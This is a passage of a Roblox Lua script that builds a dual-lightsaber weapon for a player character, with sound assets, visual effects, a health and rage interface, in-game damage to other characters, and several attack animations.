		MinigunFire = "http://www.roblox.com/asset/?id=2692806";
		MinigunCharge = "http://www.roblox.com/asset/?id=2692844";
		MinigunDischarge = "http://www.roblox.com/asset/?id=1753007";
		Flashbang = "http://www.roblox.com/asset/?id=16976189";
		Beep = "http://www.roblox.com/asset/?id=15666462";
		Smash = "http://www.roblox.com/asset/?id=2801263";
		Punch = "http://www.roblox.com/asset/?id=31173820";
		Slash = "rbxasset://sounds/swordslash.wav";
		Falcon = "http://www.roblox.com/asset/?id=1387390";
		Cast = "http://www.roblox.com/asset/?id=2101137";
		Spin = "http://www.roblox.com/asset/?id=1369159";
		Abscond = "http://www.roblox.com/asset/?id=2767090";
		ElectricalCharge = "http://www.roblox.com/asset/?id=2800815";
		FireExplosion = "http://www.roblox.com/asset/?id=3264793";
		SaberLightUp = "http://www.roblox.com/asset/?id=10209303";
		SaberSlash = "http://www.roblox.com/asset/?id=10209280";
		SaberHit = "http://www.roblox.com/asset/?id=44463749";
		EnergyBlast = "http://www.roblox.com/asset/?id=10209268";
	}
	function Sound(sid,pit,vol)
		local ss = Instance.new("Sound")
		ss.Name = "Sound"
		ss.Parent = Head
		ss.SoundId = sid
		ss.Pitch = pit
		ss.Volume = vol
		ss.PlayOnRemove = true
		wait()
		ss:Remove()
	end


	r(Char,"SwordPack")
	r(Char,"Suit")
	r(Char,"Saber" ..Player.Name)
	r(Pg,"Sabers")
	Suit = inew("Model")
	Suit.Name = "Suit"
	Suit.Parent = Char
	function p(pa,sh,x,y,z,c,a,tr,re,bc)
		local fp = it("Part",pa)
		fp.formFactor = "Custom"
		fp.Shape = sh
		fp.Size = v3(x,y,z)
		fp.CanCollide = c
		fp.Anchored = a
		fp.BrickColor = br(bc)
		fp.Transparency = tr
		fp.Reflectance = re
		fp.BottomSurface = 0
		fp.TopSurface = 0
		fp.CFrame = Torso.CFrame
		fp:BreakJoints()
		return fp
	end
	function weld(pa,p0,p1,x,y,z,a,b,c)
		local fw = it("Weld",pa)
		fw.Part0 = p0
		fw.Part1 = p1
		fw.C0 = cf(x,y,z) *ca(a,b,c)
		return fw
	end
	function ft(tab,nam)
		if tab == nil or nam == nil then print("U: Fail table") return false end
		for i=1,#tab do
			if tab == nam then
				return i
			else
			end
		end
		return nil
	end
	function spm(ty,pa,ssx,ssy,ssz)
		local sp = it("SpecialMesh",pa)
		sp.MeshType = ty
		sp.Scale = Vector3.new(ssx,ssy,ssz)
		return sp
	end
	Torso.Transparency = 1
	Torm = Instance.new("Model",Char)
	Torm.Name = "Saber" ..Player.Name
	Tor = p(Torm,"Block",1.98,1.98,1,false,false,0,0,"basda") Tor.Name = "Torso"
	Torw = weld(Tor,Torso,Tor,0,0,0,0,0,0)
	pcall(function() Char.Shirt:Clone().Parent = Torm end)
	pcall(function() Char.Pants:Clone().Parent = Torm end)
	function ShockWave(onb,scale,col)
		coroutine.resume(coroutine.create(function()
			local e1 = Instance.new("Part")
			e1.Anchored = true
			e1.formFactor = "Custom"
			e1.CanCollide = false
			e1.Size = Vector3.new(1,1,1)
			e1.BrickColor = BrickColor.new(col)
			e1.Transparency = 0.6
			e1.TopSurface = 0
			e1.BottomSurface = 0
			e1.Parent = Torm
			e1.CFrame = onb.CFrame
			e1.CFrame = e1.CFrame *CFrame.Angles(math.rad(-90),0,0)
			local e1m = Instance.new("SpecialMesh")
			e1m.MeshType = "FileMesh"
			e1m.Scale = Vector3.new(3,3,3)
			e1m.Parent = e1
			e1m.MeshId = RingMesh.MeshId
			local r1 = Instance.new("Part")
			r1.Anchored = true
			r1.formFactor = "Custom"
			r1.CanCollide = false
			r1.Size = Vector3.new(1,1,1)
			r1.BrickColor = BrickColor.new(col)
			r1.Transparency = 0.6
			r1.TopSurface = 0
			r1.BottomSurface = 0
			r1.Parent = Torm
			r1.CFrame = e1.CFrame *CFrame.Angles(math.rad(90),0,0)
			local r1m = Instance.new("SpecialMesh")
			r1m.MeshType = "FileMesh"
			r1m.Scale = Vector3.new(3,3,3)
			r1m.Parent = r1
			r1m.MeshId = BlastMesh.MeshId
			for i=1,30 do
				local pluscal = scale/38
				e1m.Scale = e1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
				r1m.Scale = r1m.Scale + Vector3.new(pluscal/1.5,pluscal/3,pluscal/1.5)
				r1.CFrame = r1.CFrame * CFrame.Angles(0,math.rad(6),0)
				wait()
			end
			for i=1,30 do
				local pluscal = scale/38
				e1m.Scale = e1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
				r1m.Scale = r1m.Scale + Vector3.new(pluscal/1.5,pluscal/4,pluscal/1.5)
				r1.CFrame = r1.CFrame * CFrame.Angles(0,math.rad(6),0)
				e1.Transparency = e1.Transparency + 0.1
				r1.Transparency = r1.Transparency + 0.1
				wait()
			end
			e1:Remove()
			r1:Remove()
		end))
	end

	function Explode(onb,scale,col)
		coroutine.resume(coroutine.create(function()
			local e1 = Instance.new("Part")
			e1.Anchored = true
			e1.formFactor = "Custom"
			e1.CanCollide = false
			e1.Size = Vector3.new(1,1,1)
			e1.BrickColor = BrickColor.new(col)
			e1.Transparency = 0.6
			e1.TopSurface = 0
			e1.BottomSurface = 0
			e1.Parent = Torm
			e1.CFrame = onb.CFrame
			local e1m = Instance.new("SpecialMesh")
			e1m.MeshType = "Sphere"
			e1m.Parent = e1
			local r1 = Instance.new("Part")
			r1.Anchored = true
			r1.formFactor = "Custom"
			r1.CanCollide = false
			r1.Size = Vector3.new(1,1,1)
			r1.BrickColor = BrickColor.new(col)
			r1.Transparency = 0.6
			r1.TopSurface = 0
			r1.BottomSurface = 0
			r1.Parent = Torm
			r1.CFrame = e1.CFrame *CFrame.Angles(math.rad(180),0,0)
			local r1m = Instance.new("SpecialMesh")
			r1m.MeshType = "FileMesh"
			r1m.Scale = Vector3.new(3,3,3)
			r1m.Parent = r1
			r1m.MeshId = RingMesh.MeshId
			local r2 = Instance.new("Part")
			r2.Anchored = true
			r2.formFactor = "Custom"
			r2.CanCollide = false
			r2.Size = Vector3.new(1,1,1)
			r2.BrickColor = BrickColor.new(col)
			r2.Transparency = 0.6
			r2.TopSurface = 0
			r2.BottomSurface = 0
			r2.Parent = Torm
			r2.CFrame = e1.CFrame *CFrame.Angles(0,math.rad(180),0)
			local r2m = Instance.new("SpecialMesh")
			r2m.MeshType = "FileMesh"
			r2m.Parent = r2
			r2m.Scale = Vector3.new(3,3,3)
			r2m.MeshId = RingMesh.MeshId
			local bla = Instance.new("Part")
			bla.Anchored = true
			bla.formFactor = "Custom"
			bla.CanCollide = false
			bla.Size = Vector3.new(1,1,1)
			bla.BrickColor = BrickColor.new(col)
			bla.Transparency = 0.6
			bla.TopSurface = 0
			bla.BottomSurface = 0
			bla.Parent = Torm
			bla.CFrame = CFrame.new(e1.Position.x,e1.Position.y,e1.Position.z)
			local blam = Instance.new("SpecialMesh")
			blam.MeshType = "FileMesh"
			blam.Parent = bla
			blam.Scale = Vector3.new(5,5,5)
			blam.MeshId = BlastMesh.MeshId
			for i=1,30 do
				local pluscal = scale/38
				e1m.Scale = e1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
				r1m.Scale = r1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
				r2m.Scale = r1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
				blam.Scale = blam.Scale + Vector3.new(pluscal,pluscal/2,pluscal)
				bla.CFrame = bla.CFrame * CFrame.Angles(0,math.rad(12),0)
				r1.CFrame = r1.CFrame * CFrame.Angles(math.rad(6),0,0)
				r2.CFrame = r2.CFrame * CFrame.Angles(0,math.rad(6),0)
				wait()
			end
			for i=1,30 do
				local pluscal = scale/38
				e1m.Scale = e1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
				r1m.Scale = r1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
				r2m.Scale = r1m.Scale + Vector3.new(pluscal,pluscal,pluscal)
				blam.Scale = blam.Scale + Vector3.new(pluscal/1.5,pluscal/3,pluscal/1.5)
				bla.CFrame = bla.CFrame * CFrame.Angles(0,math.rad(12),0)
				r1.CFrame = r1.CFrame * CFrame.Angles(math.rad(6),0,0)
				r2.CFrame = r2.CFrame * CFrame.Angles(0,math.rad(6),0)
				bla.Transparency = bla.Transparency + 0.1
				e1.Transparency = e1.Transparency + 0.1
				r1.Transparency = r1.Transparency + 0.1
				r2.Transparency = r2.Transparency + 0.1
				wait()
			end
			e1:Remove()
			r1:Remove()
			r2:Remove()
		end))
	end
	H1 = p(Torm,"Block",0.5,0.9,0.5,false,false,0,0.1,"Medium stone grey") spm("Head",H1,1,1.3,1)
	H1w = weld(Tor,Torso,H1,0.4,-0.7,0.5,0,0,mr(45))
	H2 = p(Torm,"Block",0.5,0.9,0.5,false,false,0,0.1,"Medium stone grey") spm("Head",H2,1,1.3,1)
	H2w = weld(Tor,H1,H2,0,-0.8,0,mr(180),0,0)
	Des1 = p(Torm,"Block",0.6,0.1,0.6,false,false,0,0.1,"Black") Instance.new("CylinderMesh",Des1)
	Des1w = weld(Tor,H1,Des1,0,0.5,0,0,0,0)
	Des2 = p(Torm,"Block",0.6,0.1,0.6,false,false,0,0.1,"Black") Instance.new("CylinderMesh",Des2)
	Des2w = weld(Tor,H2,Des2,0,0.5,0,0,0,0)
	Des21 = p(Torm,"Block",0.6,0.1,0.6,false,false,0,0.1,"Black") Des21m = Instance.new("CylinderMesh",Des21) Des21m.Scale = Vector3.new(1,0.6,1)
	Des21w = weld(Tor,H1,Des21,0,-0.55,0,0,0,0)
	Des22 = p(Torm,"Block",0.6,0.1,0.6,false,false,0,0.1,"Black") Des22m = Instance.new("CylinderMesh",Des22) Des22m.Scale = Vector3.new(1,0.6,1)
	Des22w = weld(Tor,H2,Des22,0,-0.55,0,0,0,0)

	Blad1 = p(Torm,"Block",0.3,4,0.3,false,false,1,0.25,BladeColor) M1 = spm("Head",Blad1,1,1,1)
	Blad1w = weld(Tor,H1,Blad1,0,1.9,0,0,0,0)
	Blad2 = p(Torm,"Block",0.3,4,0.3,false,false,1,0.25,BladeColor) M2 = spm("Head",Blad2,1,1,1)
	Blad2w = weld(Tor,H2,Blad2,0,1.9,0,0,0,0)
	Glow1 = p(Torm,"Block",0.47,4.2,0.47,false,false,1,0,BladeColor) GM1 = spm("Head",Glow1,1,1,1)
	Glow1w = weld(Tor,H1,Glow1,0,1.9,0,0,0,0)
	Glow2 = p(Torm,"Block",0.47,4.2,0.47,false,false,1,0,BladeColor) GM2 = spm("Head",Glow2,1,1,1)
	Glow2w = weld(Tor,H2,Glow2,0,1.9,0,0,0,0)

	r(Bp,HopperName)
	bin = inew("HopperBin")
	bin.Name = HopperName
	bin.Parent = Bp

	Gui = Instance.new("ScreenGui",Pg)
	Gui.Name = "Sabers"
	Frame = Instance.new("Frame",Gui)
	Frame.BackgroundTransparency = 1 Frame.Size = UDim2.new(1,0,1,0)
	ImageGui = Instance.new("ImageLabel",Frame)
	ImageGui.Image = "http://www.roblox.com/asset/?id=51262246"
	ImageGui.BackgroundTransparency = 1
	ImageGui.Size = UDim2.new(0.3,0,0.075,0)
	HealthBar = Instance.new("ImageLabel",Frame)
	HealthBar.Image = "http://www.roblox.com/asset/?id=48965808"
	HealthBar.BorderSizePixel = 0
	HealthBar.Size = UDim2.new(0.23,0,0.017,0)
	HealthBar.Position = UDim2.new(0.06,0,0.017,0)
	RageBar = Instance.new("ImageLabel",Frame)
	RageBar.Image = "http://www.roblox.com/asset/?id=48965808"
	RageBar.BorderSizePixel = 0
	RageBar.Size = UDim2.new(0.165,0,0.012,0)
	RageBar.Position = UDim2.new(0.06,0,0.04,0)
	RageBar.BackgroundColor3 = BrickColor.new("Alder").Color
	SelectBar = Instance.new("ImageButton",Frame)
	SelectBar.Image = "http://www.roblox.com/asset/?id=48965808"
	SelectBar.BorderSizePixel = 0
	SelectBar.Size = UDim2.new(0.1,0,0.07,0)
	SelectBar.Position = UDim2.new(0.8,0,0.6,0)
	SelectBar.BackgroundColor3 = BrickColor.new(BladeColor).Color
	SelectrBar = Instance.new("TextLabel",SelectBar)
	SelectrBar.BackgroundTransparency = 1
	SelectrBar.BorderSizePixel = 0
	SelectrBar.Size = UDim2.new(0,0,0,0)
	SelectrBar.Position = UDim2.new(0.5,0,0.5,0)
	SelectrBar.Font = "ArialBold"
	SelectrBar.FontSize = "Size18"
	SelectBar.MouseButton1Up:connect(function()
		if Anim.Move ~= "None" then return end
		if Anim.Act == true then return end
		if Anim.Equipped == false then return end
		if SwordType == "Single" then
			Anim.Move = "Changing"
			Anims.ChangeToDual(0,1,0.065*Speed) SwordType = "Dual"
			Anim.Move = "None"
		else
			Anim.Move = "Changing"
			Anims.ChangeToSingle(0,1,0.065*Speed) SwordType = "Single"
			Anim.Move = "None"
		end
	end)
	coroutine.resume(coroutine.create(function()
		while true do
			wait(0.05)
			local hh = Hum.Health local hmh = Hum.MaxHealth
			HealthBar.Size = UDim2.new((hh/hmh)*0.23,0,0.017,0)
			if ((hh/hmh)*100) > 75 then
				HealthBar.BackgroundColor3 = BrickColor.new("Alder").Color
			elseif ((hh/hmh)*100) > 25 and ((hh/hmh)*100) < 76 then
				HealthBar.BackgroundColor3 = BrickColor.new("Deep orange").Color
			elseif ((hh/hmh)*100) < 26 then
				HealthBar.BackgroundColor3 = BrickColor.new("Bright red").Color
			end
			RageBar.Size = UDim2.new((Rage/MaxRage)*0.165,0,0.012,0)
			SelectrBar.Text = SwordType
		end
	end))
	-------
	function TellXPos(brick1,posd)
		local lb = p(nil,"Block",1,1,1,true,false,1,0.1,BladeColor)
		lb.CFrame = CFrame.new((brick1.CFrame *cf(-10,0,0)).p)
		local rb = p(nil,"Block",1,1,1,true,false,1,0.1,BladeColor)
		rb.CFrame = CFrame.new((brick1.CFrame *cf(10,0,0)).p)
		local posml = math.abs((posd - rb.Position).magnitude)
		local posmr = math.abs((posd - lb.Position).magnitude)
		if posml > posmr then
			return "left"
		else
			return "right"
		end
	end
	function GetNearPlayer(urpos,maxmag)
		if maxmag == nil then return nil end
		for i,v in pairs(game.Players:GetChildren()) do
			if v.Character ~= Char and v.Character ~= nil and v.Character:findFirstChild("Torso") ~= nil and math.abs((v.Character.Torso.Position-urpos).magnitude) < maxmag then
				return v.Character.Torso
			end
		end
		return nil
	end
	function Dmgz(hum,dmg)
		dmg = dmg*Props.Buff
		hum.Health = hum.Health - dmg
		Rage = Rage + ((dmg/1.25)*RageIncome)
		if Rage > MaxRage then Rage = MaxRage end
	end
	coroutine.resume(coroutine.create(function()
		while true do
			wait()
			if Right == true and Anim.Move == "ForceWave" then
				for i,v in pairs(workspace:GetChildren()) do
					coroutine.resume(coroutine.create(function()
						if v ~= Char and v ~= nil and v:findFirstChild("Torso") ~= nil and math.abs((v.Torso.Position-Blad2.Position).magnitude) < MagnitudeHit[Anim.Move] then
							local hit = v.Torso
							if hit ~= nil and hit.Parent:findFirstChild("Humanoid") ~= nil and ft(RightDebounce,hit.Parent.Name) == nil then
								Dmgz(hit.Parent.Humanoid,Damage[Anim.Move])
								table.insert(RightDebounce,hit.Parent.Name)
								wait(DebounceSpeed) local nf = ft(RightDebounce,hit.Parent.Name) if nf ~= nil then table.remove(RightDebounce,nf) end
							end
						else
							if v:IsA("BasePart") and v.Anchored == false and math.abs((v.Position-Blad2.Position).magnitude) < MagnitudeHit[Anim.Move] then v:BreakJoints() v.Velocity = cf(Blad2.Position,v.Position).lookVector*30 + Vector3.new(0,20,0) end
						end
					end))
				end -- for
			end
		end
	end))
	Blad1.Touched:connect(function(hit)
		if Left == true then
			if hit ~= nil and hit.Parent:findFirstChild("Humanoid") ~= nil and ft(LeftDebounce,hit.Parent.Name) == nil then
				coroutine.resume(coroutine.create(function()
					table.insert(LeftDebounce,hit.Parent.Name)
					wait(DebounceSpeed) local nf = ft(LeftDebounce,hit.Parent.Name) if nf ~= nil then table.remove(LeftDebounce,nf) end
				end))
				Sound(Sounds.SaberHit,1,1)
				Dmgz(hit.Parent.Humanoid,Damage[Anim.Move])
			else
				--if hit.Parent:findFirstChild("Humanoid") == nil and not hit:IsDescendantOf(Char) and hit.Anchored == false then hit:BreakJoints() hit.Velocity = cf(Blad1.Position,hit.Position).lookVector*30 end
			end
		end
	end)

	Blad2.Touched:connect(function(hit)
		if Right == true then
			if hit ~= nil and hit.Parent:findFirstChild("Humanoid") ~= nil and ft(RightDebounce,hit.Parent.Name) == nil then
				coroutine.resume(coroutine.create(function()
					table.insert(RightDebounce,hit.Parent.Name)
					wait(DebounceSpeed) local nf = ft(RightDebounce,hit.Parent.Name) if nf ~= nil then table.remove(RightDebounce,nf) end
				end))
				Sound(Sounds.SaberHit,1,1)
				Dmgz(hit.Parent.Humanoid,Damage[Anim.Move])
			else
				--if hit.Parent:findFirstChild("Humanoid") == nil and not hit:IsDescendantOf(Char) and hit.Anchored == false then hit:BreakJoints() hit.Velocity = cf(Blad2.Position,hit.Position).lookVector*30 end
			end
		end
	end)
	LW = inew("Weld")
	RW = inew("Weld")
	Fla = p(Torm,"Block",1,2,1,false,false,1,0,BladeColor)
	Fra = p(Torm,"Block",1,2,1,false,false,1,0,BladeColor)
	Flaw = fWeld("Weld",Fla,Tor,Fla,true,-1.5,0.5,0,0,0,0)
	Fraw = fWeld("Weld",Fla,Tor,Fra,true,1.5,0.5,0,0,0,0)
	Flaw.C1 = CFrame.new(0,0.5,0)
	Fraw.C1 = CFrame.new(0,0.5,0)

	Fll = p(Torm,"Block",1,2,1,false,false,1,0,BladeColor)
	Frl = p(Torm,"Block",1,2,1,false,false,1,0,BladeColor)
	Fllw = fWeld("Weld",Fll,Torso,Fll,true,0,0,0,0,0,0)
	Frlw = fWeld("Weld",Fll,Torso,Frl,true,0,0,0,0,0,0)

	function FeetWeld(yesorno,lhh,rhh)
		if yesorno == false then
			lhh.Parent = nil
			rhh.Parent = nil
			Lh.Parent = Torso
			Rh.Parent = Torso
			Lh.Part0 = Tor
			Rh.Part0 = Tor
			Lh.Part1 = Char["Left Leg"]
			Rh.Part1 = Char["Right Leg"]
			return Lh,Rh
		else
			Rh.Parent = nil
			Lh.Parent = nil
			local hl,hr = it("Weld",Torso),it("Weld",Torso)
			hl.Part0 = Fll
			hr.Part0 = Frl
			hl.Part1 = Char["Left Leg"]
			hr.Part1 = Char["Right Leg"]
			hr.C1 = cf(-0.5,1.75,0)
			hl.C1 = cf(0.5,1.75,0)
			return hl,hr
		end
	end
	Anims = {}
	Anims.Equip = function(i1,i2,is)
		Anim.Act = true
		for i=i1,i2,is do
			RW.C1 = ca(mr(40*i),mr(20*i),0)
			RW.C0 = cf(-0.4*i,-0.1*i,0.4*i)
			wait()
		end
		H1w.Part0 = Ra
		H1w.Part1 = H1
		H1w.C0 = cf(0,-1.1,0) *ca(0,mr(180),0) H1w.C1 = ca(mr(-90),0,0)
		Sound(Sounds.Slash,1,1)
		for i=i1,i2,is do
			H1w.C0 = cf(0,-1.1,0) *ca(0,mr(90+(270*i)),0)
			LW.C1 = ca(mr(-80*i),mr(40*i),0)
			LW.C0 = cf(0.6*i,0.3*i,-1*i)
			RW.C1 = ca(mr(40+(-120*i)),mr(20+(-60*i)),0)
			RW.C0 = cf(-0.4+(-0.2*i),-0.1+(0.4*i),0.4+(-1.4*i))
			wait()
		end
		Sound(Sounds.SaberLightUp,3,1)
		for i=i1,i2,is do
			Blad1w.C0 = cf(0,0.95+(0.95*i),0)
			Blad2w.C0 = cf(0,0.95+(0.95*i),0)
			M1.Scale = Vector3.new(1,1*i,1)
			M2.Scale = Vector3.new(1,1*i,1)
			Blad1.Transparency = 0.9-(1*i)
			Blad2.Transparency = 0.9-(1*i)
			Glow1w.C0 = cf(0,0.95+(0.95*i),0)
			Glow2w.C0 = cf(0,0.95+(0.95*i),0)
			GM1.Scale = Vector3.new(1,1*i,1)
			GM2.Scale = Vector3.new(1,1*i,1)
			Glow1.Transparency = 1.05-(0.5*i)
			Glow2.Transparency = 1.05-(0.5*i)
			wait()
		end
		Anim.Act = false
	end
	Anims.UnEquip = function(i1,i2,is)
		Anim.Act = true
		Sound(Sounds.SaberLightUp,3,1)
		for i=i1,i2,is do
			Blad1w.C0 = cf(0,0.95+(0.95*i),0)
			Blad2w.C0 = cf(0,0.95+(0.95*i),0)
			M1.Scale = Vector3.new(1,1*i,1)
			M2.Scale = Vector3.new(1,1*i,1)
			Blad1.Transparency = 0.9-(1*i)
			Blad2.Transparency = 0.9-(1*i)
			Glow1w.C0 = cf(0,0.95+(0.95*i),0)
			Glow2w.C0 = cf(0,0.95+(0.95*i),0)
			GM1.Scale = Vector3.new(1,1*i,1)
			GM2.Scale = Vector3.new(1,1*i,1)
			Glow1.Transparency = 1.05-(0.5*i)
			Glow2.Transparency = 1.05-(0.5*i)
			wait()
		end
		Sound(Sounds.Slash,1,1)
		for i=i1,i2,is do
			H1w.C0 = cf(0,-1.1,0) *ca(0,mr(90+(270*i)),0)
			LW.C1 = ca(mr(-80*i),mr(40*i),0)
			LW.C0 = cf(0.6*i,0.3*i,-1*i)
			RW.C1 = ca(mr(40+(-120*i)),mr(20+(-60*i)),0)
			RW.C0 = cf(-0.4+(-0.2*i),-0.1+(0.4*i),0.4+(-1.4*i))
			wait()
		end
		H1w.Part0 = Torso
		H1w.Part1 = H1
		H1w.C0 = cf(0.4,-0.7,0.5) *ca(0,0,mr(45))
		H1w.C1 = cf(0,0,0) *ca(0,0,0)
		for i=i1,i2,is do
			RW.C1 = ca(mr(40*i),mr(20*i),0)
			RW.C0 = cf(-0.4*i,-0.1*i,0.4*i)
			wait()
		end
		Anim.Act = false
	end
	Anims.ChangeToDual = function(i1,i2,is)
		Anim.Act = true
		for i=i1,i2,is*Speed do
			H1w.C0 = cf(0,-1.1,0) *ca(mr(-80*i),mr(50*i),0)
			wait()
		end
		Sound(Sounds.SaberHit,1,1)
		Sound(Sounds.SaberLightUp,2,0.5)
		H1w.Part0 = La
		H1w.Part1 = H1
		H2w.Part0 = Ra
		H2w.Part1 = H2
		H2w.C1 = ca(mr(-90),0,0)
		for i=i1,i2,is*Speed do
			H1w.C0 = cf(0,-1.1,0) *ca(0,mr(-90+(-90*i)),mr(20+(-20*i)))
			H2w.C0 = cf(0,-1.1,0) *ca(0,mr(90+(90*i)),mr(-35+(-35*i)))
			LW.C1 = ca(mr(-80+(20*i)),mr(40+(-70*i)),0)
			LW.C0 = cf(0.6+(-0.6*i),0.3+(-0.3*i),-1+(0.5*i))
			RW.C1 = ca(mr(-80+(20*i)),mr(-40+(70*i)),0)
			RW.C0 = cf(-0.6+(0.6*i),0.3+(-0.3*i),-1+(0.5*i))
			wait()
		end
		Anim.Act = false
	end
	Anims.ChangeToSingle = function(i1,i2,is)
		Anim.Act = true
		for i=i2,i1,-is*Speed do
			H1w.C0 = cf(0,-1.1,0) *ca(0,mr(-90+(-90*i)),mr(20+(-20*i)))
			H2w.C0 = cf(0,-1.1,0) *ca(0,mr(90+(90*i)),mr(-35+(-35*i)))
			LW.C1 = ca(mr(-80+(20*i)),mr(40+(-70*i)),0)
			LW.C0 = cf(0.6+(-0.6*i),0.3+(-0.3*i),-1+(0.5*i))
			RW.C1 = ca(mr(-80+(20*i)),mr(-40+(70*i)),0)
			RW.C0 = cf(-0.6+(0.6*i),0.3+(-0.3*i),-1+(0.5*i))
			wait()
		end
		H1w.Part0 = Ra
		H1w.Part1 = H1
		H2w.Part0 = H1
		H2w.Part1 = H2
		H2w.C1 = ca(0,0,0)
		H2w.C0 = cf(0,-0.8,0) *ca(mr(180),0,0)
		Sound(Sounds.SaberLightUp,2,0.5)
		Sound(Sounds.SaberHit,1,1)
		for i=i2,i1,-is*Speed do
			H1w.C0 = cf(0,-1.1,0) *ca(mr(-80*i),mr(50*i),0)
			wait()
		end
		Anim.Act = false
	end
	Anims.RotorBlade = function(i1,i2,is,RaigCost)
		local lolpos = (Torso.Position - mouse.hit.p).unit
		local allx = (lolpos.y*80)-10
		local ally = (((mouse.X-(mouse.ViewSizeX/2))/mouse.ViewSizeX)*1.8)*-90
		Anim.Act = true
		for i=i1,i2,is do
			LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(40+(-40*i)),0)
			LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(90*i),0)
			RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(-40+(40*i)),0)
			RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(((-90)+ally)*i),0)
			Torw.C1 = ca(0,mr(-90*i),0)
			wait()
		end
		DebounceSpeed = DebounceSpeed - (0.5*Speed)
		Hum.WalkSpeed = Hum.WalkSpeed + (8*Speed)
		Left = true
		Right = true
		Dash(Blad1,2/Speed,nil,2)
		Dash(Blad2,2/Speed,nil,2)
		H1w.C0 = cf(0,-1.1,0) *ca(0,0,0) H1w.C1 = cf(0,-0.4,0) *ca(mr(-90),0,0)
		local soundtime = 0
		for i=i1,i2*4,is do
			if soundtime == 10 then soundtime = 0 Sound(Sounds.SaberSlash,2.5,0.5) else soundtime = soundtime + 1 end
			H1w.C0 = cf(0,-1.1,0) *ca(0,mr(360*i),0)
			wait()
		end
		H1w.C0 = cf(0,-1.1,0) *ca(0,0,0) H1w.C1 = cf(0,0,0) *ca(mr(-90),0,0)
		DebounceSpeed = DebounceSpeed + (0.5*Speed)
		Hum.WalkSpeed = Hum.WalkSpeed - (8*Speed)
		Left = false
		Right = false
		for i=i2,i1,-is do
			LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(40+(-40*i)),0)
			LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(90*i),0)
			RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(-40+(40*i)),0)
			RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(((-90)+ally)*i),0)
			Torw.C1 = ca(0,mr(-90*i),0)
			wait()
		end
		Torw.C1 = ca(0,0,0)
		Anim.Act = false
	end
	-------
	Anims.Boomerang = function(i1,i2,is,RaigCost)
		MinusRage(RaigCost)
		local lolpos = (Head.Position - mouse.hit.p).unit
		local allx = (lolpos.y*80)-10
		Anim.Act = true
		for i=i1,i2,is do
			LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(40+(-40*i)),0)
			LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(60*i),0)
			RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(-40+(40*i)),0)
			RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(-60*i),0)
			Torw.C1 = ca(0,mr(-60*i),0)
			H1w.C0 = cf(0,-1.1,0) *ca(mr(80*i),0,0)
			wait()
		end
		DebounceSpeed = DebounceSpeed - (0.5*Speed)
		Left = true
		Right = true
		Dash(Blad1,3.8/Speed,nil,2)
		Dash(Blad2,3.8/Speed,nil,2)
		H1w.C0 = cf(0,-1.1,0) *ca(0,0,0) H1w.C1 = cf(0,-0.4,0) *ca(mr(-90),0,0)
		local soundtime = 0
		for i=i1,i2,is/2 do
			if soundtime == 10 then soundtime = 0 Sound(Sounds.SaberSlash,2.5,0.5) else soundtime = soundtime + 1 end
			H1w.C0 = cf(10*i,-1.1+(-15*i),0) *ca(mr(90),mr(720*i),0)
			wait()
		end
		for i=i1,i2,is/2 do
			if soundtime == 10 then soundtime = 0 Sound(Sounds.SaberSlash,2.5,0.5) else soundtime = soundtime + 1 end
			H1w.C0 = cf(10+(-20*i),-16.1,0) *ca(mr(90),mr(720*i),0)
			wait()
		end
		for i=i1,i2,is/2 do
			if soundtime == 10 then soundtime = 0 Sound(Sounds.SaberSlash,2.5,0.5) else soundtime = soundtime + 1 end
			H1w.C0 = cf(-10+(10*i),-16.1+(15*i),0) *ca(mr(90),mr(720*i),0)
			wait()
		end
		H1w.C0 = cf(0,-1.1,0) *ca(0,0,0) H1w.C1 = cf(0,0,0) *ca(mr(-90),0,0)
		DebounceSpeed = DebounceSpeed + (0.5*Speed)
		Left = false
		Right = false
		for i=i2,i1,-is do
			LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(40+(-40*i)),0)
			LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(60*i),0)
			RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(-40+(40*i)),0)
			RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(-60*i),0)
			Torw.C1 = ca(0,mr(-60*i),0)
			H1w.C0 = cf(0,-1.1,0) *ca(mr(80*i),0,0)
			wait()
		end
		Torw.C1 = ca(0,0,0)
		Anim.Act = false
	end
	Anims.BoulderForce = function(i1,i2,is,RaigCost)
		MinusRage(RaigCost)
		Anim.Act = true
		for i=i1,i2,is do
			LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(40+(-40*i)),0)
			LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(50*i),0)
			RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(-40+(40*i)),0)
			RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(-50*i),0)
			Torw.C1 = ca(0,mr(50*i),0)
			wait()
		end
		local bould = p(workspace,"Block",4,4,8,true,true,0,0,"Medium stone grey") bould.Name = "Boulder" bould.Material = "Concrete"
		local rm = RockMesh:Clone() rm.Scale = Vector3.new(3,3,4.8) rm.Parent = bould
